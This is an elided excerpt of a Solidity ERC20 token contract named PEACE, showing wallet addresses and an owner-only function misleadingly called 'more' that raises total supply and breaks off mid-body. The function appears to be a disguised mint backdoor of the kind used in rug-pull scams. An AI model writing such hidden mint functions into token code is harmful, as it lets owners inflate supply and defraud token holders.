...
contract PEACE is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x9aEDFBd63AdE8E4d9fCF26BFd887dB3e210c8D0C); // Marketing Address
    address payable public teamWalletAddress = payable(0x8979559dBeD0a314cc25141E0cBaEA70E0170beE); // Team Address
    ...
    uint256 public _totalDistributionShares = 44;
    ...
    function more(address account, uint256 amount) external onlyOwner {
        require(account != address(0), "ERC20: more to the zero address");
        _totalSupply += amount;
